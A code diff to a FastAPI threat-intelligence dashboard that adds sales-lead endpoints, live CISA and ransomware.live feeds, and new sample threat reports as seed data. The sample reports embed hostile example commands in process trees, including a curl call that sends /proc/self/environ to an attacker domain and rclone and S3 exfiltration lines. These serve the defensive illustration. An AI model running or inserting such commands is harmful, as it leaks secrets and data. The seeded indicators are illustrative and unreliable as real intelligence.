@@ -136,6 +136,23 @@ class ThreatReport(ThreatReportBase):
 ProcessNode.model_rebuild()
 
 
+class LeadCreate(BaseModel):
+    name: str
+    email: str
+    company: Optional[str] = None
+    phone: Optional[str] = None
+    company_size: Optional[str] = None
+    interest: Optional[str] = None
+    message: Optional[str] = None
+
+
+class Lead(LeadCreate):
+    model_config = ConfigDict(extra="ignore")
+    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
+    status: str = "new"
+    created_at: str = Field(default_factory=now_iso)
+
+
 # ---------------------------------------------------------------------------
 # Auth routes
 # ---------------------------------------------------------------------------
@@ -202,6 +219,23 @@ async def delete_threat(threat_id: str, user: dict = Depends(get_current_user)):
 
 
 # ---------------------------------------------------------------------------
+# Leads (Request a Security Assessment)
+# ---------------------------------------------------------------------------
+@api_router.post("/leads", response_model=Lead)
+async def create_lead(payload: LeadCreate):
+    lead = Lead(**payload.model_dump())
+    await db.leads.insert_one(lead.model_dump())
+    logger.info(f"New security assessment lead: {lead.email} ({lead.company})")
+    return lead
+
+
+@api_router.get("/leads", response_model=List[Lead])
+async def list_leads(user: dict = Depends(get_current_user)):
+    docs = await db.leads.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
+    return [Lead(**d) for d in docs]
+
+
+# ---------------------------------------------------------------------------
 # Live external threat feed (CISA Known Exploited Vulnerabilities)
 # ---------------------------------------------------------------------------
 _feed_cache: dict[str, Any] = {"ts": None, "data": None}
@@ -229,8 +263,10 @@ async def live_feed():
                 "dateAdded": v.get("dateAdded"),
                 "action": v.get("requiredAction"),
                 "ransomware": v.get("knownRansomwareCampaignUse", "Unknown"),
+                "nvd_url": f"https://nvd.nist.gov/vuln/detail/{v.get('cveID')}",
+                "detail_url": f"https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext={v.get('cveID')}",
             }
-            for v in vulns_sorted[:24]
+            for v in vulns_sorted[:50]
         ]
         result = {
             "source": "CISA Known Exploited Vulnerabilities",
@@ -248,6 +284,48 @@ async def live_feed():
         if _feed_cache["data"]:
             return _feed_cache["data"]
         raise HTTPException(status_code=502, detail="Unable to reach live threat feed")
+
+
+_attack_cache: dict[str, Any] = {"ts": None, "data": None}
+
+
+@api_router.get("/attack-feed")
+async def attack_feed():
+    """Real-time attack feed: recent ransomware victims from ransomware.live (cached 20 min)."""
+    now = datetime.now(timezone.utc)
+    if _attack_cache["data"] and _attack_cache["ts"] and (now - _attack_cache["ts"]) < timedelta(minutes=20):
+        return _attack_cache["data"]
+    try:
+        async with httpx.AsyncClient(timeout=15, follow_redirects=True) as hc:
+            r = await hc.get("https://api.ransomware.live/v2/recentvictims")
+            r.raise_for_status()
+            raw = r.json()
+        items = []
+        for v in raw[:40]:
+            items.append({
+                "victim": v.get("victim"),
+                "group": v.get("group"),
+                "country": v.get("country"),
+                "sector": v.get("activity") if v.get("activity") not in (None, "Not Found") else None,
+                "domain": v.get("domain"),
+                "date": v.get("attackdate") or v.get("discovered"),
+                "screenshot": v.get("screenshot"),
+                "url": v.get("url"),
+            })
+        result = {
+            "source": "ransomware.live · Recent Victims",
+            "updated": now.isoformat(),
+            "count": len(items),
+            "items": items,
+        }
+        _attack_cache["data"] = result
+        _attack_cache["ts"] = now
+        return result
+    except Exception as e:
+        logger.error(f"Attack feed error: {e}")
+        if _attack_cache["data"]:
+            return _attack_cache["data"]
+        raise HTTPException(status_code=502, detail="Unable to reach live attack feed")
 
 
 @api_router.get("/")
@@ -342,16 +420,89 @@ SAMPLE_THREATS = [
         },
         "source": "NivX Threat Intel",
     },
+    {
+        "title": "Scattered Spider Help-Desk Social Engineering",
+        "summary": "Threat actor impersonated employees to a service desk, reset MFA, and pivoted to cloud identity provider. NivX identity analytics flagged impossible-travel sign-ins minutes before privilege escalation.",
+        "severity": "critical",
+        "category": "Identity / Social Engineering",
+        "threat_actor": "Scattered Spider (UNC3944)",
+        "image_url": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200",
+        "attack_chain": ["Reconnaissance", "Initial Access", "Privilege Escalation", "Lateral Movement", "Collection", "Exfiltration"],
+        "iocs": ["ip:104.28.246.11", "email:it-support@nivx-helpdesk[.]com", "ua:Mozilla/5.0 (okta-bypass)"],
+        "process_tree": {
+            "name": "okta-session", "pid": "-", "cmd": "MFA reset via help desk", "malicious": True,
+            "children": [
+                {"name": "aws-cli", "pid": "3011", "cmd": "aws sts assume-role", "malicious": True, "children": [
+                    {"name": "s3-sync", "pid": "3044", "cmd": "aws s3 sync s3://crown-jewels ./", "malicious": True, "children": []}
+                ]}
+            ]
+        },
+        "source": "NivX Threat Intel",
+    },
+    {
+        "title": "LockBit Affiliate Double-Extortion Campaign",
+        "summary": "Initial access broker sold RDP creds; affiliate exfiltrated 400GB before encryption. NivX MDR isolated 3 hosts and blocked the exfil channel, containing spread to 4% of the estate.",
+        "severity": "critical",
+        "category": "Ransomware",
+        "threat_actor": "LockBit 3.0 affiliate",
+        "image_url": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1200",
+        "attack_chain": ["Initial Access", "Discovery", "Lateral Movement", "Collection", "Exfiltration", "Impact"],
+        "iocs": ["sha256:c9d3...81be", "ext:.lockbit", "ip:193.201.9.55", "tool:rclone.exe"],
+        "process_tree": {
+            "name": "mstsc.exe", "pid": "1120", "cmd": "RDP session (stolen creds)", "malicious": True,
+            "children": [
+                {"name": "rclone.exe", "pid": "2288", "cmd": "rclone copy C:\\ mega:exfil", "malicious": True, "children": []},
+                {"name": "lockbit.exe", "pid": "2290", "cmd": "lockbit -encrypt -spread", "malicious": True, "children": []}
+            ]
+        },
+        "source": "NivX Threat Intel",
+    },
+    {
+        "title": "Malicious npm Package Backdoors CI Pipeline",
+        "summary": "A typosquatted dependency executed a postinstall script that exfiltrated CI secrets and planted a build-time backdoor. NivX SCA blocked the package hash across all pipelines.",
+        "severity": "high",
+        "category": "Supply Chain / DevSecOps",
+        "threat_actor": "Unattributed",
+        "image_url": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1200",
+        "attack_chain": ["Resource Development", "Initial Access", "Execution", "Credential Access", "Exfiltration"],
+        "iocs": ["npm:reqwest-utils@1.2.9", "domain:collect-metrics[.]dev", "sha256:44af...9c02"],
+        "process_tree": {
+            "name": "node", "pid": "512", "cmd": "npm install", "malicious": False,
+            "children": [
+                {"name": "sh", "pid": "540", "cmd": "node postinstall.js", "malicious": True, "children": [
+                    {"name": "curl", "pid": "551", "cmd": "curl -d @/proc/self/environ collect-metrics.dev", "malicious": True, "children": []}
+                ]}
+            ]
+        },
+        "source": "NivX Threat Intel",
+    },
+    {
+        "title": "Volt Typhoon Living-off-the-Land in OT Network",
+        "summary": "State actor used only built-in tools (LOLBins) to persist in critical-infrastructure OT for months. NivX behavioral analytics surfaced anomalous wmic and netsh usage from a jump host.",
+        "severity": "high",
+        "category": "APT / Critical Infrastructure",
+        "threat_actor": "Volt Typhoon",
+        "image_url": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1200",
+        "attack_chain": ["Initial Access", "Persistence", "Defense Evasion", "Discovery", "Lateral Movement"],
+        "iocs": ["ip:45.32.174.20", "lolbin:wmic.exe", "lolbin:netsh.exe", "cred:cached NTLM"],
+        "process_tree": {
+            "name": "wmiprvse.exe", "pid": "760", "cmd": "wmic process call create", "malicious": True,
+            "children": [
+                {"name": "netsh.exe", "pid": "812", "cmd": "netsh interface portproxy add", "malicious": True, "children": []}
+            ]
+        },
+        "source": "NivX Threat Intel",
+    },
 ]
 
 
 async def seed_threats():
-    count = await db.threat_reports.count_documents({})
-    if count == 0:
-        for t in SAMPLE_THREATS:
+    for t in SAMPLE_THREATS:
+        existing = await db.threat_reports.find_one({"title": t["title"]})
+        if existing is None:
             report = ThreatReport(**t)
             await db.threat_reports.insert_one(report.model_dump())
-        logger.info("Seeded sample threat reports")
+    logger.info("Threat reports seeded/verified")
 
 
 @app.on_event("startup")
